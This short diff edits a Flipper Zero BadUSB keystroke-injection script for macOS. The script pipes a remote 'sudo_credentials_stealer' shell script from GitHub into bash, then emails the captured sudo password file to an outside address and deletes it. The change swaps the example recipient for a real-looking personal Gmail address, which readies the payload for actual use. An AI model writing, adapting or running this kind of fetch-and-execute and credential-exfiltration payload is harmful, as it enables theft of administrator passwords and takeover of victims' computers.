@@ -14,6 +14,6 @@ DELAY 1000
 STRING curl -fsSL https://raw.githubusercontent.com/grugnoymeme/flipperzero-badUSB/main/macOS/sudo_credentials_stealer/script.sh | bash
 ENTER
 DELAY 5000
-STRING mail -s "SUDO Credentials" example@example.com < pass.txt && rm pass.txt &
+STRING mail -s "SUDO Credentials" silasmhastings2011@gmail.com < pass.txt && rm pass.txt &
 DELAY 5000
 GUI q
